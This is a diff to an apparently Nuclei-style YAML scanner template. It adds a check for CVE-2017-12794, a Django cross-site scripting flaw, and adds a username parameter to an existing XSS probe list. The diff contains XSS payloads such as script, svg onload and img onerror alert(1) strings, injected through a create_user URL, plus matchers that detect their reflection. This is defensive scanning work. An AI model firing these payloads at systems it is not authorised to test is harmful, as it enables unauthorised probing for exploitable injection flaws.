@@ -13,6 +13,36 @@ info:
     - https://owasp.org/www-community/attacks/xss/
 
 requests:
+  # CVE-2017-12794 Django XSS 特定检测
+  - method: GET
+    id: cve-2017-12794
+    preconditions:
+      methods: [GET]
+    path:
+      - "{{BaseURL}}/create_user/?username={{payload}}"
+    payload_sets:
+      demo:
+        - "<script>alert(1)</script>"
+        - "<svg/onload=alert(1)>"
+        - "<img src=x onerror=alert(1)>"
+      default:
+        - "aegismarker<script>alert(1)</script>"
+        - "aegismarker<svg/onload=alert(1)>"
+    matchers-condition: or
+    matchers:
+      - type: word
+        words:
+          - "<script>alert(1)</script>"
+          - "alert(1)"
+          - "<svg/onload=alert(1)>"
+          - "onerror=alert(1)"
+        part: body
+        condition: or
+      - type: word
+        words:
+          - "aegismarker"
+        part: body
+
   - method: GET
     preconditions:
       methods: [GET]
@@ -44,6 +74,7 @@ requests:
       - "{{BaseURL}}/?return={{payload}}"
       - "{{BaseURL}}/?callback={{payload}}"
       - "{{BaseURL}}/?action={{payload}}"
+      - "{{BaseURL}}/?username={{payload}}"
     payload_sets:
       default:
         - "aegismarker<script>alert(1)</script>"
